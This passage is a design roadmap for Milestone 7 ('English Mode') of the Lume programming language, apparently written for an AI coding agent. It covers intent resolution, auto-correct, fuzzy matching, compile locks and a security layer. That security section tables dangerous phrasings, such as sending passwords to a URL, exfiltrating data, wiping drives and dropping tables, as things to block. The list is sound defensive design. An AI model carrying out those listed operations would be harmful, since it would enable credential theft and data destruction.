# LUME — Natural Language Evolution Roadmap
### Milestones 7-13: From English Mode to Universal Programming
**Date:** March 7, 2026
**From:** Jason (Trust Layer / DarkWave Ecosystem)
**To:** Lume Agent (lume-lang.com / lume-lang.org)

---

## CONTEXT

Lume already compiles `.lume` files through the pipeline: **Lexer -> Parser -> AST -> Transpiler -> JavaScript**. The existing keywords (`ask`, `think`, `generate`, `show`, `let`, `monitor`, `heal`, `optimize`, `evolve`, `mutate`) proved that natural-language-inspired syntax dramatically reduces friction. Milestones 1-6 are complete and passing 219 tests. These seven milestones take the language to its ultimate form.

**Milestones 1-6 (COMPLETE) — What Was Actually Built:**

1. **Core Language & Compiler** — Lexer, parser, transpiler foundation. 32/32 tests passing. Zero dependencies. Clean JS output from `.lume` source files.
2. **Full Core Language** — Variables (`let`, `define`), loops (`repeat`, `for each`, `while`), functions (`to`), error handling (Result type, `or fail with`), types (text, number, boolean, list, map), scoping, string interpolation. All transpile to correct JavaScript.
3. **AI Integration** — `ask`, `think`, `generate` as first-class keywords. AI model calls are native syntax, not imports. Typed AI outputs with structured responses. Model configuration (`using model`, `with temperature`).
4. **JavaScript Interop & CLI** — `use` keyword for npm imports, `expose` for exports. `lume build`, `lume run`, `lume repl` CLI commands. npm-publishable package structure.
5. **IDE Tooling & Developer Experience** — REPL mode, syntax highlighting definitions, error diagnostics with line/column info, `lume test` command, project scaffolding (`lume init`).
6. **Self-Sustaining Runtime** — Four layers: Self-Monitoring (execution time, call count, error rate, memory, AI cost tracking per function), Self-Healing (`@healable` decorator, exponential backoff retries, circuit breaker pattern, AI model fallback chains), Self-Optimizing (AI analyzes slow functions and suggests/auto-applies improvements in a sandbox with rollback), Self-Evolving (background daemon for dependency monitoring, model benchmarking, schema adaptation, cost optimization). Keywords: `monitor`, `heal`, `optimize`, `evolve`, `mutate`. All four layers integrate — monitor feeds healer, healer feeds optimizer, optimizer feeds evolver.

**Current Compiler Pipeline (DO NOT MODIFY — extend only):**
```
Lume Source (.lume) -> Lexer -> Parser -> AST -> Transpiler -> JavaScript (.js)
```

**Current File Structure (as built):**
```
lume/
  src/
    lexer.js          # Tokenizer
    parser.js          # AST builder
    transpiler.js      # AST -> JavaScript
    runtime/
      monitor.js       # Layer 1: Self-monitoring
      healer.js        # Layer 2: Self-healing
      optimizer.js     # Layer 3: Self-optimizing
      evolver.js       # Layer 4: Self-evolving
      sandbox.js       # Isolated execution for testing mutations
      mutation-log.js  # Tracks all code changes with rollback
  bin/
    lume.js            # CLI entry point
  tests/
    unit/              # 219 tests, all passing
    integration/
```

**Key AST Node Types Already Implemented:**
- `VariableDeclaration`, `ConstantDeclaration`, `FunctionDeclaration`
- `IfStatement`, `ForLoop`, `WhileLoop`, `RepeatLoop`, `ForEachLoop`
- `AskExpression`, `ThinkExpression`, `GenerateExpression`
- `ShowStatement`, `ReturnStatement`
- `UseStatement` (imports), `ExposeStatement` (exports)
- `IntentBlock`, `MonitorBlock`, `HealBlock`, `OptimizeBlock`, `EvolveBlock`
- `MutateStatement`, `RollbackStatement`
- `HealableDecorator`, `CriticalDecorator`, `ExperimentalDecorator`

Understanding these existing AST node types is critical. All new milestones must produce AST nodes that the existing transpiler can handle, OR extend the transpiler to handle new node types. The transpiler is the single source of truth for JavaScript output.

---

## IMPORTANT: INTERACTION WITH MILESTONE 6

Programs written in English/Natural mode (Milestones 7-8) must support all Milestone 6 self-sustaining features. The Intent Resolver should map natural language phrases to existing Milestone 6 AST nodes:

| Natural Language | Maps To (Existing AST) |
|-----------------|----------------------|
| `monitor this function` | `MonitorBlock` node |
| `if this fails, retry 3 times` | `HealBlock` with retries config |
| `optimize this for speed` | `OptimizeBlock` node |
| `keep this running even if it breaks` | `@healable` decorator + `HealBlock` |
| `track how much this costs` | `MonitorBlock` with `ai_call_cost` metric |
| `if the AI model is down, use a backup` | `HealBlock` with `fallback_models` |
| `watch for security updates` | `EvolveBlock` with `dependency_updates: true` |

This is not optional. Self-sustaining features are a core part of Lume. Natural language mode must be a complete interface to the language, not a subset.

---

## MILESTONE 7: ENGLISH MODE

### What It Is

A new compiler mode where the input is plain English sentences. Not "English-like syntax" — actual English. The compiler understands intent from context and resolves it into the existing Lume AST, which then transpiles to JavaScript as normal.

### How It Works

Add a **front-end stage** to the existing compiler pipeline:

```
CURRENT:   Lume Source -> Lexer -> Parser -> AST -> Transpiler -> JavaScript
NEW:       English Source -> Auto-Correct -> Intent Resolver -> Security/Conflict Check -> Lume AST -> Transpiler -> JavaScript + Source Map + Compile Lock
```

The Intent Resolver is the new component. It sits before the existing pipeline and converts English sentences into Lume AST nodes. The Intent Resolver produces AST nodes directly — it bypasses the Lexer and Parser entirely and feeds AST nodes straight to the Transpiler.

**What you CAN and CANNOT modify:**
- **Do NOT modify** the Lexer or Parser — they are not involved in English Mode processing
- **Do NOT modify** how the Transpiler handles existing AST node types — backward compatibility is absolute
- **You CAN extend** the Transpiler to handle new AST node types (e.g., `RawBlock` for escape hatch, source map metadata nodes)
- **You CAN add** pre-transpiler stages (Auto-Correct, Tolerance Chain, Security Layer, Conflict Detection) — these sit before the Transpiler in the pipeline
- **You CAN add** post-transpiler stages (source map generation, compile lock writing) — these run after the Transpiler produces JavaScript output
- **The pipeline for English Mode is:** `English Input -> Auto-Correct -> Intent Resolver (with Tolerance Chain) -> Security Layer -> Conflict Detection -> Lume AST -> Transpiler (extended for new node types) -> JavaScript + Source Map + Compile Lock`

### New Files to Create

```
src/
  intent-resolver/
    index.js           # Main entry point — routes to Layer A or Layer B
    pattern-library.js # Layer A: deterministic phrase -> AST mappings
    ai-resolver.js     # Layer B: LLM-powered resolution for complex input
    context-engine.js  # Tracks project state (data models, variables, scope)
```

### The Intent Resolver — Two Layers

**Layer A: Pattern Matching (fast, offline, no AI needed)**

A dictionary of common English phrases mapped directly to AST nodes. These are deterministic — no ambiguity, no AI call required.

| English Input | Resolves To (Lume AST) |
|---------------|----------------------|
| `get the user's name` | Variable access: `user.name` |
| `show it on the page` | `ShowStatement` node |
| `when the button is clicked` | Event listener: `on click` |
| `save this to the database` | `store` operation |
| `ask the AI to summarize this` | `AskExpression` node |
| `repeat this 5 times` | `RepeatLoop` node, count: 5 |
| `if the user is logged in` | `IfStatement` node: `if user.authenticated` |
| `get data from [url]` | `fetch` operation |
| `create a new user with name and email` | Object creation with fields |
| `sort the list by date` | Array sort operation |
| `send an email to [address]` | `GenerateExpression` + send operation |
| `wait 3 seconds` | `delay(3000)` |
| `connect to the database` | Database connection setup |
| `log the error` | `ShowStatement` to error stream |

Build this as a growing pattern library. Start with 50-100 common patterns. The patterns should support variable slots (indicated by brackets or context). This layer handles the simple, common operations instantly without any external calls.

**Layer B: AI-Powered Resolution (for complex/ambiguous input)**

When a sentence doesn't match any pattern, pass it to an LLM with the current project context. The AI resolves the intent and returns a Lume AST node.

**What the AI receives:**
1. The English sentence
2. The current project's data model (what variables, types, and structures exist)
3. The current scope (what's available — functions, imports, UI elements)
4. The target context (is this a server file? a UI component? a data operation?)
5. The list of valid AST node types (from the "Key AST Node Types" section above)

**What the AI returns:**
A structured Lume AST node — NOT JavaScript, NOT Lume source code. The AI maps English to Lume's existing AST format. The transpiler handles the rest. The AI must return valid AST nodes that the transpiler already knows how to process.

**Example flow:**
```
Input:    "get all users who signed up this month and show their names in a list"
Context:  { dataModel: { users: { fields: [name, email, signupDate] } }, scope: "ui-component" }
AI Output: [
  { type: "query", target: "users", filter: { field: "signupDate", op: ">=", value: "startOfMonth()" } },
  { type: "ShowStatement", format: "list", field: "name" }
]
-> Transpiler converts to JavaScript as normal
```

### File Format

English Mode files use the `.lume` extension with a mode declaration at the top:

```
mode: english

get the user's name and email from the database
if the name is empty, show "No name provided"
otherwise, show "Hello, {name}" on the page

when the submit button is clicked:
  save the form data to the database
  show "Saved!" for 3 seconds
  then redirect to the dashboard
```

The `mode: english` declaration tells the compiler to route through the Intent Resolver instead of the standard Lexer. The compiler should check the first line of the file — if it starts with `mode:`, use that mode. Otherwise, use the standard Lume compilation path (backward compatible).

### Context Engine

The Intent Resolver needs to understand what's available in the current project. Build a **Context Engine** (`src/intent-resolver/context-engine.js`) that:

1. Scans the project's data models (schemas, types, database tables)
2. Tracks declared variables and their types within the current file
3. Knows the available UI elements (if in a UI context)
4. Knows the available API endpoints (if in a server context)
5. Maintains a "what was just mentioned" short-term memory so pronouns and references resolve correctly (e.g., "show **it**" -> refers to the last retrieved value)

The Context Engine feeds into both Layer A (pattern matching uses context to fill variable slots) and Layer B (AI resolution uses context to disambiguate).

### Auto-Correct Layer

Before input even reaches the Tolerance Chain, it passes through an Auto-Correct Layer that cleans up the input — just like spell check on your phone, but smarter because it understands the programming context. This is self-correcting software at the input level, philosophically identical to Milestone 6's self-healing runtime. The runtime fixes broken API calls automatically; the compiler fixes broken input automatically. Same principle, different layer.

**Pipeline with Auto-Correct:**
```
Raw Input -> Auto-Correct Layer -> Tolerance Chain -> AST -> Transpiler -> JavaScript
```

**Create `src/intent-resolver/auto-correct.js` with these capabilities:**

1. **Spell check with project-aware dictionary:**
   - Standard English dictionary for general words
   - Project custom dictionary: variable names, function names, data model fields, table names from the Context Engine are added as valid words automatically
   - Programming term dictionary: "database," "function," "variable," "parameter," "array," etc.
   - If "usr" appears and the project has a "user" table, correct to "user"
   - If "clculate" appears and the project has a "calculate" function, correct to "calculate"

2. **Context-aware correction (NOT just spell check):**
   - A normal spell checker doesn't know if you meant "save" or "safe" — both are valid English words
   - Lume's Auto-Correct uses the Context Engine to resolve ambiguity:
     - In a database context: "safe the data" -> "save the data" (write operation)
     - In a security context: "save the password" stays as "save" (storage operation)
     - In a UI context: "hid the button" -> "hide the button" (visibility operation)
     - In a loop context: "repat this 5 times" -> "repeat this 5 times"
   - The Context Engine knows what operations make sense in the current scope

3. **Show corrections transparently:**
   - Every correction is shown to the developer in the compiler output:
     ```
     [auto-correct] Line 3: "gt the usr name" -> "get the user name"
     [auto-correct] Line 7: "safe the form data" -> "save the form data"
     ```
   - Corrections are NOT silent — the developer always sees what was changed
   - A `--no-autocorrect` flag disables the layer for developers who want raw input processing
   - A `--strict` flag treats any correction as a warning instead of auto-applying

4. **Learning from usage:**
   - If a developer consistently types "db" to mean "database," the system learns that shorthand
   - Learned corrections are saved to `.lume/autocorrect-dictionary.json` per project
   - Developers can add custom abbreviations: `lume config alias db=database`
   - Team-level dictionaries can be shared via version control

5. **Voice-to-text cleanup:**
   - Speech-to-text engines often produce phonetically correct but contextually wrong words
   - "Create a function for four users" — is "four" the number 4, or "for" the preposition? Context resolves it.
   - "Write the data to the sequel database" — "sequel" is how people say "SQL." Auto-correct to "SQL."
   - "Send a curl request" — keep "curl" as-is (technical term, not a misspelling)
   - The Auto-Correct Layer marks technical terms as "do not correct" so domain-specific words survive

**Example — full auto-correct flow:**
```
Raw voice input:   "gt all the usrs who singed up this moth and shwo there names"
After auto-correct: "get all the users who signed up this month and show their names"
Corrections shown:  [auto-correct] "gt"->"get", "usrs"->"users", "singed"->"signed",
                    "moth"->"month", "shwo"->"show", "there"->"their"
Then:              Tolerance Chain processes the clean sentence -> AST -> JavaScript
```

The Auto-Correct Layer runs BEFORE the Tolerance Chain. This means the Tolerance Chain receives much cleaner input, making fuzzy matching and AI resolution far more accurate. They work together — Auto-Correct handles character-level errors (typos, phonetic mistakes), and the Tolerance Chain handles sentence-level ambiguity (wrong word order, unclear intent).

---

### Error Handling & Tolerance Chain

Human input is messy. Even after the Auto-Correct Layer cleans up typos and phonetic errors, people may use unusual grammar, unclear phrasing, or ambiguous references. The Tolerance Chain handles everything the Auto-Correct Layer can't fix. This is not optional — it is a core feature.

**The Tolerance Chain — ordered fallback sequence for every input (after auto-correct):**

```
Step 1: EXACT PATTERN MATCH (Layer A)
   Input matches a known pattern exactly
   -> Resolve immediately, zero ambiguity
   -> Example: "get the user's name" -> user.name

Step 2: FUZZY PATTERN MATCH (Layer A with tolerance)
   Input is close to a known pattern but has typos or minor errors
   -> Use Levenshtein distance (edit distance) to find the nearest pattern
   -> If similarity >= 85%, treat as a match
   -> Example: "gt the users name" (missing 'e', missing apostrophe)
              -> matches "get the user's name" at 89% similarity
              -> Resolve as user.name
   -> Example: "shwo the result" -> matches "show the result" at 87%
              -> Resolve as ShowStatement

Step 3: GRAMMAR-TOLERANT PATTERN MATCH (Layer A with word-bag matching)
   Input has the right words but wrong order or structure
   -> Extract key nouns and verbs, ignore word order
   -> Match against patterns by semantic content, not syntax
   -> Example: "the user name get from database"
              -> Key words: [user, name, get, database]
              -> Matches pattern: "get the user's name from the database"
              -> Resolve as user.name + database query

Step 4: AI RESOLUTION — HIGH CONFIDENCE (Layer B, confidence >= 80%)
   None of the Layer A strategies matched
   -> Send to LLM with full project context
   -> AI returns AST node(s) with confidence score
   -> If confidence >= 80%, apply the resolution silently
   -> Log what happened for transparency

Step 5: AI RESOLUTION — LOW CONFIDENCE (Layer B, confidence 50-79%)
   AI understood something but isn't sure
   -> Show the user what it thinks they meant
   -> Ask for confirmation BEFORE compiling
   -> Format: "I think you mean: [interpreted code]. Is that right? (y/n)"
   -> If user confirms, compile and add to pattern library for future use
   -> If user rejects, ask for clarification

Step 6: AI RESOLUTION — VERY LOW CONFIDENCE (Layer B, confidence < 50%)
   AI can't confidently determine intent
   -> Show multiple possible interpretations ranked by confidence
   -> Format: "I'm not sure what you mean. Did you mean:
              1. [interpretation A] (45% confident)
              2. [interpretation B] (38% confident)
              3. Something else?"
   -> User picks one or rephrases

Step 7: UNRESOLVABLE
   Neither Layer A nor Layer B could determine intent
   -> Clear error message: "I couldn't understand: [original sentence]"
   -> Suggest similar known phrases: "Try something like: [closest patterns]"
   -> Never crash. Never compile garbage. Never silently skip the line.
```

**The golden rule: NEVER SILENTLY GUESS.** If the system isn't confident, it asks. A program that compiles incorrectly is infinitely worse than a compiler that asks "did you mean this?" Silent wrong guesses destroy trust in the language.

**Fuzzy Matching Implementation Details:**

Create `src/intent-resolver/fuzzy-matcher.js` with these capabilities:

1. **Levenshtein distance** — character-level edit distance for catching typos ("shwo" -> "show", "databse" -> "database")
2. **Word-bag matching** — extract meaningful words (nouns, verbs), ignore articles/prepositions/word order, match against pattern word-bags. This handles bad grammar and non-native English sentence structures.
3. **Phonetic matching** — words that sound the same but are spelled differently ("their/there/they're", "write/right"). Use a Soundex or Metaphone algorithm.
4. **Common misspelling dictionary** — frequently mistyped programming terms ("fucntion" -> "function", "retrun" -> "return", "varibale" -> "variable"). Build a dictionary of 200+ common misspellings.
5. **Contraction tolerance** — "dont" = "don't", "cant" = "can't", "its" = "it's" (and vice versa). Missing apostrophes should never cause a match failure.

**Learning from corrections:**

When a user corrects a failed match (Steps 5-6), the system should remember that correction:
- Store the original input and the confirmed resolution in a project-local pattern cache
- Next time the same or similar input appears, it resolves instantly via Layer A
- Over time, the pattern library grows organically from actual usage
- Pattern cache is saved to `.lume/learned-patterns.json` in the project root

### Voice-Specific Error Handling

Voice input introduces unique challenges beyond typos and grammar. The following must be handled in Milestone 9, but the architecture should be designed in Milestone 7 so the Intent Resolver is ready.

**Self-Corrections:**
People correct themselves mid-sentence while speaking. The Intent Resolver must detect correction phrases and replace the previous reference:

| Spoken Input | What Happens |
|-------------|-------------|
| "get the users... no, the customers" | Replace "users" with "customers" |
| "save it to... I mean delete it from the database" | Replace "save" with "delete" |
| "actually, make that a list not a table" | Replace "table" with "list" |
| "wait, I said that wrong — show the email, not the name" | Replace "name" with "email" |

Correction trigger phrases: "no," "I mean," "actually," "wait," "sorry," "I meant," "scratch that," "not that," "correction"

When a correction phrase is detected:
1. Identify what's being corrected (the noun/verb before the correction phrase)
2. Identify the replacement (the noun/verb after the correction phrase)
3. Substitute and re-resolve the full sentence
4. If the correction is ambiguous, ask: "Did you want to change [X] to [Y]?"

**Filler Words:**
The speech-to-text engine (Whisper) strips most filler words ("um," "uh," "like," "you know"), but some may survive transcription. The Intent Resolver should have a filler word list and strip them before pattern matching:

Strip list: "um", "uh", "like", "you know", "basically", "so", "well", "right", "okay", "let me think", "hmm", "er", "ah"

**Numbers:**
"five" and "5" must resolve identically. "a hundred" = 100. "two thousand" = 2000. "a couple" = 2. "a few" = 3 (configurable). "several" = 5 (configurable). Build a word-to-number converter.

**Homophones:**
Words that sound identical but mean different things. Context resolves these:

| Spoken | Possible Meanings | Resolution |
|--------|------------------|------------|
| "right" | correct / direction | If spatial context -> direction. If conditional -> correct. |
| "write" | output text | If followed by "to file/database" -> write operation |
| "for" / "four" | loop / number | If followed by "each" or "times" -> loop. If in numeric context -> 4. |
| "new" / "knew" | create / past tense know | If followed by a noun -> create object. Otherwise -> past reference. |
| "their" / "there" / "they're" | possessive / location / contraction | Context determines: "their name" -> possessive, "over there" -> location |

The Context Engine resolves homophones by looking at surrounding words and the current scope. If still ambiguous, fall through to Layer B (AI resolution).

### CLI Usage

```bash
lume build app.lume                  # Standard Lume compilation (unchanged)
lume build app.lume --mode english   # Force English mode (override file declaration)
lume run app.lume                    # Auto-detects mode from file header
```

### Acceptance Criteria

- [ ] `mode: english` file header is recognized by the compiler
- [ ] Layer A pattern library with 50+ common phrases resolves correctly
- [ ] Layer B AI resolution handles complex multi-step sentences
- [ ] Context Engine scans project data models and populates variable slots
- [ ] Pronoun/reference resolution works ("get the user, then show **their** name")
- [ ] All existing `.lume` files without a mode declaration compile unchanged (backward compatibility is non-negotiable)
- [ ] Self-sustaining keywords (monitor, heal, optimize, evolve) can be expressed in English and resolve to correct AST nodes
- [ ] **Auto-Correct:** Spell check corrects typos using standard + project-aware dictionary before Tolerance Chain runs
- [ ] **Auto-Correct:** Context-aware correction resolves ambiguous words ("safe" vs "save") using scope context
- [ ] **Auto-Correct:** All corrections are shown transparently in compiler output — never silent
- [ ] **Auto-Correct:** `--no-autocorrect` flag disables auto-correct; `--strict` flag shows corrections as warnings only
- [ ] **Auto-Correct:** Learned corrections saved to `.lume/autocorrect-dictionary.json` per project
- [ ] **Auto-Correct:** `lume config alias` command allows custom abbreviations (e.g., db=database)
- [ ] **Auto-Correct:** Voice-to-text phonetic corrections handled ("sequel" -> "SQL", "four"/"for" resolved by context)
- [ ] **Tolerance Chain:** Fuzzy matching catches typos ("shwo" -> "show", "databse" -> "database") at 85%+ similarity
- [ ] **Tolerance Chain:** Word-bag matching handles bad grammar/word order ("the user name get from database" resolves correctly)
- [ ] **Tolerance Chain:** Common misspelling dictionary handles 200+ programming term misspellings
- [ ] **Tolerance Chain:** Missing apostrophes and contractions ("dont", "cant", "its") never cause match failures
- [ ] **Tolerance Chain:** Low-confidence AI resolution (50-79%) asks user for confirmation before compiling
- [ ] **Tolerance Chain:** Very low confidence (<50%) shows multiple interpretations ranked by confidence
- [ ] **Tolerance Chain:** Unresolvable input shows clear error with suggestions — never crashes, never compiles garbage
- [ ] **Learning:** User corrections at Steps 5-6 are saved to `.lume/learned-patterns.json` and resolve instantly next time
- [ ] **Voice prep:** Self-correction phrases ("no," "I mean," "actually") are handled — replaces previous reference with correction
- [ ] **Voice prep:** Filler words ("um," "uh," "like," "you know") are stripped before pattern matching
- [ ] **Voice prep:** Number words resolve to digits ("five" -> 5, "a hundred" -> 100)
- [ ] **Voice prep:** Homophones resolve by context ("write" vs "right", "for" vs "four")
- [ ] **Safety:** Cross-line dependency tracking — changing line 3 re-resolves dependent lines (e.g., line 7's "it" reference)
- [ ] **Safety:** Intent conflict detection — contradictory operations in the same block are flagged ("delete the users and save the users")
- [ ] **Safety:** Destructive operation confirmation — irreversible operations require explicit (y/n) before compiling
- [ ] **Safety:** Security layer flags dangerous operations (file deletion, credential access, network exfiltration)
- [ ] **Safety:** Semantic camouflage detection — catches innocent-sounding instructions with dangerous combined intent
- [ ] **Safety:** Natural language injection prevention — strict separation between developer code (compiles) and runtime data (never compiles)
- [ ] **Safety:** Privilege escalation detection — flags role changes, permission grants, auth bypass with confirmation
- [ ] **Safety:** Mass operation detection — flags unbounded loops with external side effects (email, API, SMS) and shows projected impact
- [ ] **Safety:** Resource exhaustion prevention — blocks operations exceeding configurable resource limits
- [ ] **Safety:** Sandbox mode on first run — compiled JS runs in isolated vm, shows all I/O the program WOULD do before executing for real
- [ ] **Safety:** Sandbox re-activates when compiled output changes >20% from locked version
- [ ] **Safety:** `lume run --sandbox` forces sandbox; `lume run --trusted` skips it for locked programs
- [ ] **Safety:** `.lume/security-config.json` project-level config for all security settings, committable to version control
- [ ] **Safety:** Compile lock file (`.lume/compile-lock.json`) prevents regressions when patterns/corrections evolve
- [ ] **Guardian Output Scanner:** Built into the compiler — runs automatically on every compilation for every developer, not optional, not a separate product
- [ ] **Guardian Output Scanner:** Compiled JavaScript scanned for malicious patterns AFTER transpilation, BEFORE writing to disk
- [ ] **Guardian Output Scanner:** `raw:` block output scanned for eval(), obfuscated code, credential access, unauthorized network requests
- [ ] **Guardian Output Scanner:** Community patterns from Collective Intelligence registry scanned at download time — flagged patterns quarantined
- [ ] **Guardian Output Scanner:** Configurable scan levels in `.lume/security-config.json`: off, basic, standard (default), strict
- [ ] **Guardian Output Scanner:** Blocked output shows detailed report: what was found, which line, risk level, how to resolve
- [ ] **Determinism:** AI resolutions (Layer B) are cached and committed — same input always produces same output on recompile
- [ ] **Performance:** AI calls are batched (multiple unresolved lines in one request) to minimize API calls and compile time
- [ ] **Performance:** Cost transparency — compiler shows how many AI calls were made and estimated cost
- [ ] **Escape Hatch:** `raw:` block allows inline JavaScript/Lume syntax inside English Mode files, bypassing all resolution layers
- [ ] **Debugging:** Source maps link English sentences to compiled JavaScript lines — error stack traces show the English source, not JS
- [ ] **Testing:** Intent blocks work in English Mode — natural language tests compile alongside natural language code
- [ ] **Parsing:** Sentence boundary detection — "get the user and show their name" splits into 2 operations, not 1
- [ ] **Parsing:** Negation detection — "don't," "never," "not," "skip," "except," "unless" correctly invert operations
- [ ] **Parsing:** Temporal expressions — "last week," "30 days ago," "tomorrow at 9am" generate dynamic date calculations, not static values
- [ ] **Parsing:** Complex boolean logic — "and," "or," "but not," "unless," "either/or," "except when" generate correct compound conditions
- [ ] **Parsing:** Async auto-detection — network calls, database queries, file I/O auto-generate async/await; math and local ops stay sync
- [ ] **Scope:** Pronoun scope resets at function boundaries — "it" does not carry across function definitions
- [ ] **Scope:** Distant pronoun references (>20 lines) require explicit naming or trigger a warning
- [ ] **Cross-File:** English Mode `use`/`expose` — "bring in calculate_total from utils" resolves as import; "make this available" resolves as export
- [ ] **Cross-File:** Context Engine tracks exports from other files for cross-file reference resolution
- [ ] **REPL:** `lume repl --mode english` accepts natural language input and shows results in real-time
- [ ] **Errors:** Error message standard format: error code, original input, what was attempted, suggestion for fix
- [ ] **Versioning:** Optional `lume-version: 7` declaration in file header locks compilation behavior to a specific milestone version
- [ ] **Collective Intelligence:** Opt-in anonymous pattern contribution to `lume-lang.com/patterns` registry
- [ ] **Collective Intelligence:** `lume patterns sync` downloads community-validated patterns into Layer A
- [ ] **Collective Intelligence:** Patterns promoted to official library after 100+ independent confirmations
- [ ] **Collective Intelligence:** Privacy-first — default OFF, all data anonymized, enterprise can fully disable
- [ ] **Memory:** `.lume/context-memory.json` persists developer style, project domain, and resolution history across sessions
- [ ] **Memory:** Project domain auto-detection (e-commerce, healthcare, etc.) biases ambiguity resolution
- [ ] **Synonyms:** Synonym ring for each core operation — "grab," "pull," "fetch" all resolve as "get" in Layer A without AI call

---

## CRITICAL ARCHITECTURAL REQUIREMENTS

These requirements apply across ALL milestones 7-13. They are non-negotiable and must be implemented as part of Milestone 7's foundation, because every subsequent milestone depends on them.

### 1. Cross-Line Dependency Resolution

When line 5 depends on line 3 (via pronoun references like "it," "them," "that"), and line 3 is modified, the compiler must automatically re-resolve line 5. This means the Intent Resolver must build a dependency graph of references within each file.

```
Example:
  Line 3: "get the user from the database"       -> resolves "user" as the active reference
  Line 5: "show their name"                       -> "their" refers to line 3's "user"
  Line 7: "save it"                               -> "it" refers to the most recent value

If line 3 changes to "get the order from the database":
  Line 5 must re-resolve: "their" now refers to "order" -> "show order.name"
  Line 7 must re-resolve: "it" now refers to "order" -> "save order"
```

Implement this as a reference graph in the Context Engine. When any line changes, walk the graph forward and re-resolve all dependent lines.

### 2. Intent Conflict Detection

The compiler must detect when two instructions in the same block logically contradict each other:

| Conflict Type | Example | Response |
|--------------|---------|----------|
| Create + Delete same target | "create the user, then delete the user" | Warning: "You're creating and deleting the same thing. Did you mean to update it?" |
| Read after Delete | "delete all users, then show the users" | Error: "The users were deleted on the previous line — there's nothing to show." |
| Duplicate operations | "save the data, save the data" | Warning: "This saves the same data twice. Did you mean to save it once?" |
| Type mismatch | "set the user's age to 'hello'" | Error: "Age expects a number, but 'hello' is text." |
| Unreachable code | "return the result, then show the total" | Warning: "The line after 'return' will never execute." |

This is semantic validation — the compiler understands not just what each line means, but whether the lines make sense together.

### 3. Security Layer

Natural language programs can express dangerous operations in innocent-sounding ways. The compiler MUST have a security layer that intercepts dangerous operations before they compile.

**Dangerous operation categories:**

| Category | Examples | Action |
|----------|----------|--------|
| File system destruction | "delete all files," "clear the directory," "wipe the drive" | BLOCK — require explicit confirmation with warning |
| Credential exposure | "show the API key," "send the password to [url]," "log the secret" | BLOCK — refuse to compile, explain why |
| Network exfiltration | "send all the data to [external url]," "upload everything" | WARNING — show what data would be sent, require confirmation |
| Database destruction | "drop the table," "delete all records," "truncate" | CONFIRM — show exactly what will be destroyed, require (y/n) |
| Infinite operations | "repeat forever," "keep doing this" | WARNING — "This will run forever. Add a stop condition or confirm infinite loop." |
| System commands | "run [shell command]," "execute on the server" | BLOCK — arbitrary system command execution is blocked by default |

A `--unsafe` flag allows advanced developers to bypass the security layer for legitimate use cases. But the default is always safe.

**Advanced threat categories (natural language-specific):**

| Category | Examples | Why It's Dangerous | Action |
|----------|----------|-------------------|--------|
| Semantic camouflage | "save a backup of all user passwords to my personal folder" | Each word is innocent. The combined intent is data theft. | BLOCK — flag any operation that moves credentials/sensitive data to non-standard, external, or user-specified locations |
| Natural language injection | User input field contains "delete all records" and the program processes it | Data flowing through the program could be misinterpreted as code if not properly sandboxed | ENFORCE — strict separation between developer code (compiles) and runtime data (never compiles). Data is NEVER fed through the Intent Resolver. This is the natural language equivalent of SQL injection prevention. |
| Privilege escalation | "give the user admin access," "make this account a superuser," "bypass authentication" | Sounds like a feature but changes security boundaries | CONFIRM — flag any operation that elevates permissions, changes roles, or bypasses auth. Show exactly what access is being granted. |
| Mass operations | "send an email to every user every second," "make 10,000 API calls," "copy all records to a new table" | Not destructive to the system but destructive to users, services, or budgets | WARNING — detect unbounded loops over large datasets with external side effects (email, API, SMS). Show projected impact: "This will send ~50,000 emails. Continue?" |
| Resource exhaustion | "allocate a terabyte of memory," "create a million database connections," "open every file" | Crashes the system through resource consumption, not malice | BLOCK — detect operations that request resources beyond reasonable defaults. Set configurable limits in `.lume/security-config.json` |

**Sandboxing — first-run protection:**

The first time a new `.lume` program compiles, or any time a program's compiled output changes significantly (>20% of lines differ from the locked version), the security layer activates **sandbox mode**:

1. Compiled JavaScript runs in an isolated Node.js `vm` context (or equivalent sandbox)
2. The sandbox intercepts all I/O: file system access, network calls, database queries, system commands
3. The developer sees a report of everything the program WOULD do without it actually doing it:
   ```
   [sandbox] app.lume — first-run security review:
     Line 3:  Would READ from database table "users" (247 records)
     Line 7:  Would WRITE to file "./output/report.csv"
     Line 12: Would SEND HTTP POST to "https://api.example.com/webhook"
     Line 15: Would DELETE 3 records from "expired_sessions"
   
   Approve and run for real? (y/n/review)
   ```
4. After approval, subsequent runs use the compile lock — the sandbox only re-activates if the compiled output changes
5. `lume run --sandbox` forces sandbox mode on any run (useful for reviewing untrusted code)
6. `lume run --trusted` skips sandbox for programs already in the compile lock (faster development iteration)

**Security configuration file (`.lume/security-config.json`):**

```json
{
  "sandbox_on_first_run": true,
  "sandbox_on_significant_change": true,
  "significant_change_threshold": 0.20,
  "max_records_without_confirmation": 1000,
  "blocked_domains": ["*"],
  "allowed_domains": ["api.myapp.com", "localhost"],
  "max_file_operations_per_run": 100,
  "allow_system_commands": false,
  "require_confirmation_for_deletes": true,
  "privilege_escalation_requires_confirmation": true,
  "unsafe_mode_enabled": false
}
```

This config is project-level and should be committed to version control. Team leads can lock it down and prevent individual developers from weakening security settings.

### 4. Deterministic Compilation

Layer B (AI resolution) uses an LLM, which can return different results for the same input on different days. This breaks reproducibility — a program that compiles today might compile differently tomorrow.

**Solution: Compile Lock File**

When a program compiles successfully, every resolution is saved to `.lume/compile-lock.json`:

```json
{
  "version": "1.0",
  "file": "app.lume",
  "resolutions": [
    {
      "line": 3,
      "input": "get all users who signed up this month",
      "resolved_by": "layer_b_ai",
      "confidence": 0.92,
      "ast": { "type": "query", "target": "users", "filter": "..." },
      "timestamp": "2026-09-15T14:30:00Z"
    }
  ]
}
```

On recompilation:
1. If the input line hasn't changed AND a lock entry exists -> use the locked resolution (no AI call needed)
2. If the input line has changed -> re-resolve and update the lock
3. `lume build --fresh` ignores the lock and re-resolves everything

This guarantees deterministic builds. The lock file should be committed to version control alongside the source code.

### 5. Escape Hatch

Sometimes the developer knows exactly what code they want and the natural language resolution keeps getting it wrong. They need an escape hatch to drop into raw code:

```
mode: english

get all active users from the database

raw:
  const filtered = users.filter(u => u.score > calculateThreshold(u.tier));

show the filtered results in a table
```

The `raw:` block:
- Passes through the transpiler untouched (no Auto-Correct, no Tolerance Chain, no AI resolution)
- Can contain raw JavaScript or standard Lume syntax
- Indentation defines the block boundary (like Python)
- Multiple `raw:` blocks can appear in the same file
- The Context Engine still tracks variables created inside `raw:` blocks so subsequent English lines can reference them

Also support inline raw expressions for single lines:
```
show `users.filter(u => u.active).length` active users
```
Backtick-wrapped expressions are passed through as raw JavaScript.

### 6. Source Maps & Debugging

